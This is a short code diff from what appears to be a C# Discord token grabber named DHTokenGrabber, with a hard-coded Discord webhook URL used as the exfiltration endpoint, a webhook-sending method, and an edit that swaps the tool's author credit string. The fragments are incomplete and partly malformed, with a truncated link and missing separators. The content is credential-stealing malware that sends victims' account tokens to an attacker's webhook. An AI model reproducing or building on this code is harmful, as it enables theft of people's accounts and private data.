@@ -1,4 +1,3 @@
-thub.com/NightfallGT/Mercurial-Grabber/releases
 https://discord.com/api/webhooks/915293209297551391/KdUf0SEolCuHIeFHIQfzgJkIHbzjKuTGPtuPIwAr6FQPI0rel2fb5j7NO06iCqwxw2CN
 staff
 namespace DHTokenGrabber
@@ -85,7 +84,7 @@ public static void sendWebHook(string discordWebHook,string content)
                 }) + "´´´"
             },
             {
-                "⛧♱𝖎𝖇𝖊𝖓𝖑𝖆𝖓𝖉⛧#9921"
+                "C Security#2468"
                 "redex token grabber"
             },
             {
